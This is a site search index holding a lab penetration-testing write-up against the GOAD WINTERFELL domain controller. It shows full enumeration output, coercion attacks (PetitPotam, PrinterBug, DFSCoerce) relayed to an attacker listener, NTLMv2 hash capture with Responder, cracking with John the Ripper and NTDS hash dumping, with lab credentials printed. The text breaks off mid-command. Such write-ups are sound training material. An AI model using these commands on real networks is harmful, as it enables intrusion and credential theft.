{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Playroom Security","text":"<p>Welcome to Playroom Security.</p>"},{"location":"Donations/","title":"Buy me coffee","text":"<p>Noting is too big or small.  Visit the below link or scan the QR Code attached below</p> <p></p>"},{"location":"GOAD/","title":"Notes","text":""},{"location":"GOAD/#notes","title":"Notes","text":"<ul> <li> GOAD: Overview</li> <li> GOAD: Enumeration</li> <li> GOAD: Installation</li> <li> GOAD: SevenKingdoms.local</li> <li> GOAD: North.SevenKingdoms.local</li> <li> GOAD: CastleBlack.SevenKingdoms.local</li> <li> GOAD: Meereen.essos.local</li> <li> GOAD: Braavos.essos.local</li> </ul>"},{"location":"GOAD/North/","title":"GOAD - North.SevenKingdoms.local","text":""},{"location":"GOAD/North/#goad-northsevenkingdomlocal-dc02","title":"GOAD: North.Sevenkingdom.local (DC02)","text":"<p>Info</p> <p>Created by: Dcyberguy</p> <p>Created time: October 31, 2025 9:32 PM</p> <p>Last edited by: Dcyberguy</p> <p>Last updated time: December 5, 2025 4:07 PM</p> <p>Status: In progress</p> <pre><code>Host Information\n\nHost IP: 10.10.10.11  \nDNS Name(s): winterfell.north.sevenkingdoms.local, winterfell\n</code></pre>"},{"location":"GOAD/North/#enumeration","title":"Enumeration","text":"<p>Document all enumeration don on the host to find vulnerable and attack paths</p> <pre><code>nmap -Pn -sV -sC -p- --min-rate=200 10.10.10.11 -T4\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 20:43 EST\nNmap scan report for 10.10.10.11\nHost is up (0.00024s latency).\nNot shown: 65508 closed tcp ports (conn-refused)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 02:33:52Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-17T19:07:41\n|_Not valid after:  2026-04-18T19:07:41\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| tls-alpn: \n|_  http/1.1\n|_http-title: Not Found\n|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.\n| ssl-cert: Subject: commonName=VAGRANT\n| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant\n| Not valid before: 2025-10-17T10:49:59\n|_Not valid after:  2028-10-16T10:49:59\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49688/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49698/tcp open  msrpc         Microsoft Windows RPC\n49730/tcp open  msrpc         Microsoft Windows RPC\n49845/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 49m14s, deviation: 0s, median: 49m14s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-11-25T02:34:40\n|_  start_date: N/A\n|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:02:cb:41 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 115.86 seconds\n</code></pre>"},{"location":"GOAD/North/#users-enumeration","title":"Users Enumeration","text":"<pre><code>nxc smb 10.10.10.11 --users\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-              \nSMB         10.10.10.11     445    WINTERFELL       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain\nSMB         10.10.10.11     445    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark \nSMB         10.10.10.11     445    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark \nSMB         10.10.10.11     445    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark \nSMB         10.10.10.11     445    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark \nSMB         10.10.10.11     445    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant \nSMB         10.10.10.11     445    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow \nSMB         10.10.10.11     445    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)\nSMB         10.10.10.11     445    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont \nSMB         10.10.10.11     445    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service \nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated 10 local users: NORTH\n</code></pre> <p>Found a saved passed for <code>samwell.tarly</code></p>"},{"location":"GOAD/North/#password-policy","title":"Password policy","text":"<pre><code>nxc smb 10.10.10.11 --pass-pol\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] Dumping password info for domain: NORTH\nSMB         10.10.10.11     445    WINTERFELL       Minimum password length: 5\nSMB         10.10.10.11     445    WINTERFELL       Password history length: 24\nSMB         10.10.10.11     445    WINTERFELL       Maximum password age: 311 days 2 minutes \nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Password Complexity Flags: 000000\nSMB         10.10.10.11     445    WINTERFELL           Domain Refuse Password Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Store Cleartext: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Lockout Admins: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Clear Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Anon Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Complex: 0\nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Minimum password age: 1 day 4 minutes \nSMB         10.10.10.11     445    WINTERFELL       Reset Account Lockout Counter: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Locked Account Duration: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Account Lockout Threshold: 5\nSMB         10.10.10.11     445    WINTERFELL       Forced Log off Time: Not Set\n</code></pre> <p>There is <code>5 minute</code> lockout policy for every 5 failed login attempt.</p>"},{"location":"GOAD/North/#using-enum4linux","title":"Using Enum4linux","text":"<pre><code>enum4linux 10.10.10.11\nStarting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 24 20:51:38 2025\n\n =========================================( Target Information )=========================================\n\nTarget ........... 10.10.10.11\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n ============================( Enumerating Workgroup/Domain on 10.10.10.11 )============================\n\n[+] Got domain/workgroup name: NORTH\n\n ================================( Nbtstat Information for 10.10.10.11 )================================\n\nLooking up status of 10.10.10.11\n    WINTERFELL      &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service\n    NORTH           &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name\n    NORTH           &lt;1c&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain Controllers\n    WINTERFELL      &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service\n    NORTH           &lt;1b&gt; -         M &lt;ACTIVE&gt;  Domain Master Browser\n\n    MAC Address = 00-0C-29-02-CB-41\n\n ====================================( Session Check on 10.10.10.11 )====================================\n\n[+] Server 10.10.10.11 allows sessions using username '', password ''\n\n =================================( Getting domain SID for 10.10.10.11 )=================================\n\nDomain Name: NORTH\nDomain Sid: S-1-5-21-928725054-1381016483-1750705438\n\n[+] Host is part of a domain (not a workgroup)\n\n ===================================( OS information on 10.10.10.11 )===================================\n\n[E] Can't get OS info with smbclient\n\n[+] Got OS info for 10.10.10.11 from srvinfo: \ndo_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n ========================================( Users on 10.10.10.11 )========================================\n\nindex: 0x189f RID: 0x456 acb: 0x00000210 Account: arya.stark    Name: (null)    Desc: Arya Stark\nindex: 0x18a8 RID: 0x45b acb: 0x00010210 Account: brandon.stark Name: (null)    Desc: Brandon Stark\nindex: 0x16fa RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null)    Desc: Built-in account for guest access to the computer/domain\nindex: 0x18ab RID: 0x45d acb: 0x00000210 Account: hodor Name: (null)    Desc: Brainless Giant\nindex: 0x18b1 RID: 0x460 acb: 0x00000210 Account: jeor.mormont  Name: (null)    Desc: Jeor Mormont\nindex: 0x18ae RID: 0x45e acb: 0x00040210 Account: jon.snow  Name: (null)    Desc: Jon Snow\nindex: 0x18aa RID: 0x45c acb: 0x00000210 Account: rickon.stark  Name: (null)    Desc: Rickon Stark\nindex: 0x18b0 RID: 0x45f acb: 0x00000210 Account: samwell.tarly Name: (null)    Desc: Samwell Tarly (Password : Heartsbane)\nindex: 0x18a5 RID: 0x45a acb: 0x00000210 Account: sansa.stark   Name: (null)    Desc: Sansa Stark\nindex: 0x18b4 RID: 0x461 acb: 0x00000210 Account: sql_svc   Name: (null)    Desc: sql service\n\nuser:[Guest] rid:[0x1f5]\nuser:[arya.stark] rid:[0x456]\nuser:[sansa.stark] rid:[0x45a]\nuser:[brandon.stark] rid:[0x45b]\nuser:[rickon.stark] rid:[0x45c]\nuser:[hodor] rid:[0x45d]\nuser:[jon.snow] rid:[0x45e]\nuser:[samwell.tarly] rid:[0x45f]\nuser:[jeor.mormont] rid:[0x460]\nuser:[sql_svc] rid:[0x461]\n\n ==================================( Share Enumeration on 10.10.10.11 )==================================\n\ndo_connect: Connection to 10.10.10.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n\n    Sharename       Type      Comment\n    ---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\nUnable to connect with SMB1 -- no workgroup available\n\n[+] Attempting to map shares on 10.10.10.11\n\n ============================( Password Policy Information for 10.10.10.11 )============================\n\n[+] Attaching to 10.10.10.11 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n    [!] Protocol failed: Cannot request session (Called Name:10.10.10.11)\n\n[+] Trying protocol 445/SMB...\n\n[+] Found domain(s):\n\n    [+] NORTH\n    [+] Builtin\n\n[+] Password Info for Domain: NORTH\n\n    [+] Minimum password length: 5\n    [+] Password history length: 24\n    [+] Maximum password age: 311 days 2 minutes \n    [+] Password Complexity Flags: 000000\n\n        [+] Domain Refuse Password Change: 0\n        [+] Domain Password Store Cleartext: 0\n        [+] Domain Password Lockout Admins: 0\n        [+] Domain Password No Clear Change: 0\n        [+] Domain Password No Anon Change: 0\n        [+] Domain Password Complex: 0\n\n    [+] Minimum password age: 1 day 4 minutes \n    [+] Reset Account Lockout Counter: 5 minutes \n    [+] Locked Account Duration: 5 minutes \n    [+] Account Lockout Threshold: 5\n    [+] Forced Log off Time: Not Set\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Disabled\nMinimum Password Length: 5\n\n =======================================( Groups on 10.10.10.11 )=======================================\n\n[+] Getting builtin groups:\n\ngroup:[Guests] rid:[0x222]\ngroup:[Remote Desktop Users] rid:[0x22b]\ngroup:[Network Configuration Operators] rid:[0x22c]\ngroup:[Performance Monitor Users] rid:[0x22e]\ngroup:[Performance Log Users] rid:[0x22f]\ngroup:[Distributed COM Users] rid:[0x232]\ngroup:[IIS_IUSRS] rid:[0x238]\ngroup:[Cryptographic Operators] rid:[0x239]\ngroup:[Event Log Readers] rid:[0x23d]\ngroup:[Certificate Service DCOM Access] rid:[0x23e]\ngroup:[RDS Remote Access Servers] rid:[0x23f]\ngroup:[RDS Endpoint Servers] rid:[0x240]\ngroup:[RDS Management Servers] rid:[0x241]\ngroup:[Hyper-V Administrators] rid:[0x242]\ngroup:[Access Control Assistance Operators] rid:[0x243]\ngroup:[Remote Management Users] rid:[0x244]\ngroup:[Storage Replica Administrators] rid:[0x246]\ngroup:[Pre-Windows 2000 Compatible Access] rid:[0x22a]\ngroup:[Windows Authorization Access Group] rid:[0x230]\ngroup:[Terminal Server License Servers] rid:[0x231]\ngroup:[Users] rid:[0x221]\n\n[+]  Getting builtin group memberships:\n\nGroup: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs\nGroup: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs\nGroup: Users' (RID: 545) has member: Couldn't lookup SIDs\nGroup: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs\nGroup: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs\nGroup: Guests' (RID: 546) has member: Couldn't lookup SIDs\n\n[+]  Getting local groups:\n\ngroup:[Cert Publishers] rid:[0x205]\ngroup:[RAS and IAS Servers] rid:[0x229]\ngroup:[Allowed RODC Password Replication Group] rid:[0x23b]\ngroup:[Denied RODC Password Replication Group] rid:[0x23c]\ngroup:[DnsAdmins] rid:[0x44e]\ngroup:[AcrossTheSea] rid:[0x455]\n\n[+]  Getting local group memberships:\n\nGroup: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs\n\n[+]  Getting domain groups:\n\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[DnsUpdateProxy] rid:[0x44f]\ngroup:[Stark] rid:[0x452]\ngroup:[Night Watch] rid:[0x453]\ngroup:[Mormont] rid:[0x454]\n\n[+]  Getting domain group memberships:\n\nGroup: 'Stark' (RID: 1106) has member: NORTH\\arya.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\eddard.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\catelyn.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\robb.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\sansa.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\brandon.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\rickon.stark\nGroup: 'Stark' (RID: 1106) has member: NORTH\\hodor\nGroup: 'Stark' (RID: 1106) has member: NORTH\\jon.snow\nGroup: 'Domain Computers' (RID: 515) has member: NORTH\\CASTELBLACK$\nGroup: 'Night Watch' (RID: 1107) has member: NORTH\\jon.snow\nGroup: 'Night Watch' (RID: 1107) has member: NORTH\\samwell.tarly\nGroup: 'Night Watch' (RID: 1107) has member: NORTH\\jeor.mormont\nGroup: 'Group Policy Creator Owners' (RID: 520) has member: NORTH\\Administrator\nGroup: 'Domain Guests' (RID: 514) has member: NORTH\\Guest\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\Administrator\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\vagrant\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\krbtgt\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\SEVENKINGDOMS$\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\arya.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\eddard.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\catelyn.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\robb.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\sansa.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\brandon.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\rickon.stark\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\hodor\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\jon.snow\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\samwell.tarly\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\jeor.mormont\nGroup: 'Domain Users' (RID: 513) has member: NORTH\\sql_svc\nGroup: 'Mormont' (RID: 1108) has member: NORTH\\jeor.mormont\n\n ===================( Users on 10.10.10.11 via RID cycling (RIDS: 500-550,1000-1050) )===================\n\n[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.\n\n ================================( Getting printer info for 10.10.10.11 )================================\n\ndo_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED\n\nenum4linux complete on Mon Nov 24 20:51:43 2025\n</code></pre> <p>I see that the user <code>(samwell.tarly)</code> that I found his credential is part of the <code>Domain Users Group</code></p>"},{"location":"GOAD/North/#vulnerabilities","title":"Vulnerabilities:","text":"<p>I was able to discover a number of vulnerabilities that are associated with the <code>WINTERFELL</code> machine using <code>Netexec</code></p> <pre><code>nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus                                                                 \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven\n</code></pre> <p>Running all attacks, I got back password hashes for <code>eddard.stark</code> , <code>robb.stark</code> and the <code>Administrator</code> account</p> <pre><code>nxc smb 10.10.10.11 -u samwell.tarly -p Heartsbane -M coerce_plus -o LISTENER=10.10.10.131                                           \u2500\u256f\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, DFSCoerce\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\\NetrDfsRemoveRootTarget\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\\NetrDfsAddStdRoot\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, netdfs\\NetrDfsRemoveStdRoot\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PetitPotam\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, efsrpc\\EfsRpcAddUsersToFile\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, PrinterBug\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       Exploit Success, spoolss\\RpcRemoteFindFirstPrinterChangeNotificationEx\nCOERCE_PLUS 10.10.10.11     445    WINTERFELL       VULNERABLE, MSEven\n</code></pre> <pre><code>sudo responder -I eth1                                                                                                               \u2500\u256f\n[sudo] password for kali: \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0\n\n  To support this project:\n  Github -&gt; https://github.com/sponsors/lgandx\n  Paypal  -&gt; https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n&lt;&lt; SNIP &gt;&gt;\n[SMB] NTLMv2-SSP Client   : 10.10.10.11\n[SMB] NTLMv2-SSP Username : NORTH\\WINTERFELL$\n[SMB] NTLMv2-SSP Hash     : WINTERFELL$::NORTH:bf10913df7c0114e:4486FD3E6A73A0939EF75993EEB84738:0101000000000000800AF4ADDA65DC01706A1C6E81F3B59600000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000040000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330031000000000000000000\n\n&lt;&lt; SNIP &gt;&gt;\n[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd\n[SMB] NTLMv2-SSP Username : NORTH\\eddard.stark\n[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:b59951e9dff1ac02:6FF4C58A937C20C11FA152CBFB94CE53:0101000000000000800AF4ADDA65DC01B157D99482CD820000000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000\n\n&lt;&lt; SNIP &gt;&gt;\n[SMB] NTLMv2-SSP Client   : fe80::5ce:7944:e1a:46dd\n[SMB] NTLMv2-SSP Username : NORTH\\robb.stark\n[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:218fd664f14b7a4e:853E54E69F87630F9FC6C0186BDD5E12:0101000000000000800AF4ADDA65DC013FCC9152036A475E00000000020008004A00350059004F0001001E00570049004E002D0030004E00490043004A005A004900420059005700560004003400570049004E002D0030004E00490043004A005A00490042005900570056002E004A00350059004F002E004C004F00430041004C00030014004A00350059004F002E004C004F00430041004C00050014004A00350059004F002E004C004F00430041004C0007000800800AF4ADDA65DC010600040002000000080030003000000000000000000000000030000041DDF935E26AEBC62CE72382E0BE9955E83D077840709D60BC39E08F16A41EFB0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000\n</code></pre> <p>Save all the above <code>NTLMv2-SSP</code> hash(es) to a file and try to <code>brute-force</code> it using <code>John The Ripper</code>.</p> <p>I was able to crack <code>robb.stark</code> credentials and <code>pwned</code> the <code>WINTERFELL</code> machine</p> <pre><code>john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robb-stark.hash                                                                                   \u2500\u256f\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsexywolfy        (robb.stark)     \n1g 0:00:00:00 DONE (2025-12-05 12:25) 2.325g/s 3019Kp/s 3019Kc/s 3019KC/s shaker21..sexytime1234\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p><code>Pwned</code></p>"},{"location":"GOAD/North/#enumeration-winterfell-with-robbstarks-creds","title":"Enumeration WINTERFELL with Robb.stark's creds","text":"<pre><code>nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy'                                                                                                                    \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\robb.stark:sexywolfy (Pwn3d!)\n\n\nnxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --shares                                                                                                           \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\robb.stark:sexywolfy (Pwn3d!)\nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares\nSMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark\nSMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------\nSMB         10.10.10.11     445    WINTERFELL       ADMIN$          READ,WRITE      Remote Admin\nSMB         10.10.10.11     445    WINTERFELL       C$              READ,WRITE      Default share\nSMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC\nSMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ,WRITE      Logon server share \nSMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ,WRITE      Logon server share \n</code></pre> <p>Because Robb.stark is admin, he can get the hashes for all users. like the one from <code>eddard.stark</code></p> <pre><code>nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --ntds --user eddard.stark                                                                                         \u2500\u256f\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\robb.stark:sexywolfy (Pwn3d!)\nSMB         10.10.10.11     445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.10.10.11     445    WINTERFELL       eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::\nSMB         10.10.10.11     445    WINTERFELL       [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds of which 1 were added to the database\nSMB         10.10.10.11     445    WINTERFELL       [*] To extract only enabled accounts from the output file, run the following command: \nSMB         10.10.10.11     445    WINTERFELL       [*] cat /home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | grep -iv disabled | cut -d ':' -f1\nSMB         10.10.10.11     445    WINTERFELL       [*] grep -iv disabled 